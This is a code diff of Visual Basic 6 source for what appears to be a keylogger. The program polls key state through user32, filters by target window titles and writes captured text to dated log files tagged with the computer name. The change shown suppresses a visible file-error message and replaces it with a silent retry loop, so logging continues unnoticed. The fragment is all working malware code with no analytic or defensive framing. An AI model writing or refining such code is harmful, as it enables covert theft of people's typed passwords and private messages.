@@ -73,7 +73,7 @@ Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As In
 
 Dim SettingsPath As String
 'Loadsetting variable declaration
-Dim LPath, CompName As String
+Dim LPath, LogFile, CompName As String
 'array to hold target titles
 Dim title() As String
 'if title file not fund then Log every title
@@ -153,11 +153,11 @@ End Sub
 
 Private Sub startLogging()
 
-LPath = LPath & CompName & Format$(Now, "dd" & "mm" & "yy") & ".nkl"
+LogFile = LPath & Format$(Now, "dd" & "mm" & "yy") & ".nkl"
 
-If Dir(LPath) = "" Then     'If file not exist
+If Dir(LogFile) = "" Then     'If file not exist
 'Write initials
-Open LPath For Append As 1
+Open LogFile For Append As 1
     Write #1, Chr(155), Time, Date, CompName, App.Revision
 Close #1
 End If
@@ -222,13 +222,16 @@ End Function
 '************************encrypting and Recording to file use of Append*********
 Private Sub Appendnow()
 
-If Dir(LPath) <> "" Then
-    Open LPath For Append As #1
-        Print #1, Text1.Text         'Dont encrypt
+NowSave:
+If Dir(LogFile) <> "" Then
+    Open LogFile For Append As #1
+        Print #1, Text1.Text
         Text1.Text = ""
     Close #1
 Else
-        MsgBox "File Access Error.", vbCritical, "Closed": End
+    'msgbox "File access error"
+    Call startLogging       'Again write initials
+    GoTo NowSave            'And Store this text
 End If
 
 End Sub
